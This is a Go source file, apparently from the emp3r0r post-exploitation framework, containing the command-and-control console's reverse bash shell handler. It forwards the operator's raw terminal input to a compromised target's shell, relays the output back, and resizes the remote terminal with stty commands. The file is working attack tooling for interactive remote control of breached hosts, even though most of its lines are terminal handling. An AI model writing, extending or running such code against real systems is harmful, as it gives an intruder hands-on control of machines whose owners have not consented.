package cc

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/creack/pty"
	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func reverseBash(ctx context.Context, send chan []byte, recv chan []byte) {
	var err error

	// check if stty is installed
	if !util.IsCommandExist("stty") {
		CliPrintError("stty is not found, wtf?")
		return
	}

	cancel := RShellStream.H2x.Cancel
	CliPrintInfo("Entering shell...")

	// receive and display bash's output
	go func(ctx context.Context) {
		for incoming := range recv {
			incoming = bytes.Trim(incoming, "\x00") // trim NULL bytes
			select {
			case <-ctx.Done():
				return
			default:
				_, err = os.Stdout.Write(incoming)
				if err != nil {
					CliPrintWarning("Stdout write: %v", err)
					return
				}
			}
		}
	}(ctx)

	// send whatever input to target's bash
	go func(ctx context.Context) {
		defer func() {
			// always send 'exit' to correctly log out our bash shell
			send <- []byte("exit\n\n")
		}()

		for outgoing := range send {
			select {
			case <-ctx.Done():
				return
			default:

				// if connection does not exist yet
				if RShellStream.H2x.Conn == nil {
					continue
				}
				_, err = RShellStream.H2x.Conn.Write(outgoing)
				if err != nil {
					CliPrintWarning("Send to remote: %v", err)
					return
				}
			}
		}
	}(ctx)

	// use /dev/tty for our console
	ttyf, err := os.Open("/dev/tty")
	if err != nil {
		CliPrintError("Cannot open /dev/tty: %v", err)
	}

	// back up terminal settings using `stty -g`
	out, err := exec.Command("stty", "-F", "/dev/tty", "-g").CombinedOutput()
	if err != nil {
		CliPrintError("Cannot save current terminal settings: %v\n%s", err, out)
	}
	oldTerm := strings.TrimSpace(string(out))

	// clean up connection and TTY file
	cleanup := func() {
		// if already cleaned up
		if RShellStream.H2x.Conn == nil ||
			RShellStream.H2x.Ctx == nil ||
			RShellStream.H2x.Cancel == nil {
			return
		}

		// cancel context, cleanup all goroutines
		cancel()

		// restore terminal settings
		out, err := exec.Command("stty", "-F", "/dev/tty", oldTerm).CombinedOutput()
		if err != nil {
			CliPrintError("failed to restore terminal: %v\n%s", err, out)
		}

		err = ttyf.Close()
		if err != nil {
			CliPrintWarning("Closing /dev/tty: %v", err)
		}

		// no need to close this
		// err = RShellStream.H2x.Conn.Close()
		// if err != nil {
		//	CliPrintWarning("Closing reverse shell connection: %v", err)
		// }

		// nil out RShellStream
		RShellStream.H2x.Conn = nil
		RShellStream.H2x.Ctx = nil
		RShellStream.H2x.Cancel = nil

		CliPrintInfo("Cleaned up reverseBash")
		// clear screen
		TermClear()
	}
	defer cleanup()

	/*
		set up terminal
	*/
	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func(ctx context.Context) {
		for range ch {
			select {
			case <-ctx.Done():
				return
			default:
				// resize local terminal
				if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
					CliPrintError("error resizing pty: %s", err)
					return
				}
				// sync remote terminal with stty
				winSize, err := pty.GetsizeFull(os.Stdin)
				if err != nil {
					CliPrintWarning("Cannot get terminal size: %v", err)
					return
				}
				if !strings.Contains(CurrentTarget.OS, "Windows") {
					setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
						winSize.Rows, winSize.Cols)
					send <- []byte(setupTermCmd)
				}
			}
		}
		CliPrintInfo("Terminal resizer finished")
		cancel()
	}(ctx)
	ch <- syscall.SIGWINCH // Initial resize.

	if !strings.Contains(CurrentTarget.OS, "Windows") {
		CliPrintInfo("Target is Linux, sending stty resize command")
		// resize remote terminal to match local
		currentWinSize, err := pty.GetsizeFull(os.Stdin)
		if err != nil {
			CliPrintWarning("Cannot get terminal size: %v", err)
		}
		setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
			currentWinSize.Rows, currentWinSize.Cols)
		send <- []byte(setupTermCmd)
		CliPrintInfo("Sent stty resize command")

		// switch to raw mode
		out, err = exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
		if err != nil {
			CliPrintError("stty raw mode failed: %v\n%s", err, out)
			return
		}
		CliPrintWarning("Now in raw mode")
	}

	// read user input from /dev/tty
	go func() {
		for {
			select {
			case <-ctx.Done():
				cleanup()
				color.HiCyan("Press any key to continue...")
				return
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
	}()
	for ctx.Err() == nil {
		// if connection is lost, press any key to exit
		select {
		case <-ctx.Done():
			return
		default:
			buf := make([]byte, RShellStream.BufSize)
			consoleReader := bufio.NewReader(ttyf)
			_, err := consoleReader.Read(buf)
			if err != nil {
				CliPrintWarning("Bash read input: %v", err)
				return
			}

			// send our byte
			send <- buf
		}
	}
}
